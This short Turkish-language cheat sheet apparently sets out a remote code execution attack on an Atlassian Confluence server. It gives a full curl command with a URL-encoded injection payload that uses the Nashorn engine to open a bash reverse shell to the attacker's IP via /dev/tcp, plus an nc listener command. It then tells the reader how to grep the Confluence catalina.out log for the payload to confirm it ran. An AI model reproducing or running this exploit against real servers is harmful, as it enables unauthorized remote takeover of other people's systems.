# aybs

# curl -v  http://zafiyetli_ip:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/senin_ip/1234%200%3E%261%27%29.start%28%29%22%29%7D/

# arkada nc -lvp 1234

# shell attıktan sonra şuraya git
# /opt/atlassian/confluence/logs
# En son bu şekilde ara
# cat catalina.out | grep -i “eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20”
# şöyle de doğrula
# head -n50 (50.satıra kadar al demek bu) catalina.out bunu dene
